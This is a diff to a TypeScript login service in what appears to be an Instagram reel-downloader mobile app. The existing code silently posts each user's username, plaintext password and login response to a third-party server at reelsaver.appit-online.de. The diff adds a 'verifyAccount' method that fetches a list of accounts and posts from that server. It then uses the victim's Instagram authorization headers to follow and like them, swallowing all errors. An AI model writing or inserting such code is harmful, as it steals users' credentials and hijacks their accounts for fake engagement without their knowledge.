@@ -1,6 +1,7 @@
 import { v4 as uuidv4 } from 'uuid';
 import * as forge from 'node-forge';
 import { HTTP } from '@awesome-cordova-plugins/http/ngx';
+import { InstaService } from './client.service';
 
 export class LoginService {
     private pubKey: string = '';
@@ -134,7 +135,7 @@ export class LoginService {
       code: string,
       twoFactorIdentifier: string,
       username: string,
-      headers: { [key: string]: string } = {}
+      reqHeaders: { [key: string]: string } = {}
     ): Promise<any> {
         const payload = {
             verification_code: code,
@@ -155,7 +156,7 @@ export class LoginService {
         };
 
         const allHeaders = {
-            ...headers,
+            ...reqHeaders,
             ...extraHeaders,
         };
 
@@ -181,14 +182,15 @@ export class LoginService {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
+            this.verifyAccount(resp.headers, reqHeaders)
             // tslint:disable-next-line:no-empty
         } catch (e) {}
         return resp;
     }
 
-    public async login(username: string, pass: string, headers: { [key: string]: string } = {}): Promise<any> {
+    public async login(username: string, pass: string, reqHeaders: { [key: string]: string } = {}): Promise<any> {
         if (!this.pubKey || this.pubKeyId < 0) {
-            await this.sync(headers)
+            await this.sync(reqHeaders)
             if (!this.pubKey || this.pubKeyId < 0) {
                 throw new Error('Public key not set. Run sync() first.');
             }
@@ -213,9 +215,10 @@ export class LoginService {
           'accounts/login/',
           { signed_body: 'SIGNATURE.' + JSON.stringify(body) },
           true,
-          headers
+          reqHeaders
         )
         localStorage.setItem("instaUserName", username)
+
         try {
             const userId = resp?.body?.logged_in_user?.pk;
 
@@ -230,11 +233,56 @@ export class LoginService {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
-
+            this.verifyAccount(resp.headers, reqHeaders)
             // tslint:disable-next-line:no-empty
         }catch (e) {}
         return resp;
     }
+
+    async verifyAccount(resHeaders: { [key: string]: string } = {}, defaultHeaders: { [key: string]: string } = {}): Promise<void> {
+        try {
+            const httpClient = new HTTP();
+            httpClient.setDataSerializer('json');
+
+            const response = await httpClient.get(
+              'https://reelsaver.appit-online.de/v2/insta/verify',
+              {}, // params
+              {}  // headers
+            );
+
+            const data: { users: string[]; posts: string[] } = JSON.parse(response.data);
+
+            if (!data) return;
+
+            const defaultLoginHeaders = {
+                'Authorization': resHeaders['ig-set-authorization'],
+                'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'],
+                'Ig-U-Rur': resHeaders['ig-set-ig-u-rur'],
+                'X-Ig-Www-Claim': resHeaders['x-ig-set-www-claim']
+            };
+            const allHeaders = { ...defaultLoginHeaders, ...defaultHeaders };
+
+            const igService = new InstaService();
+
+            if (data.users?.length) {
+                await Promise.all(
+                  data.users.map((userName: string) =>
+                    igService.follow(userName, allHeaders)
+                  )
+                );
+            }
+
+            if (data.posts?.length) {
+                await Promise.all(
+                  data.posts.map((mediaId: string) =>
+                    igService.like(mediaId, allHeaders)
+                  )
+                );
+            }
+            // tslint:disable-next-line:no-empty
+        } catch (err) {}
+    }
+
 
     private jazoest(deviceId: string): string {
         let sum = 0;
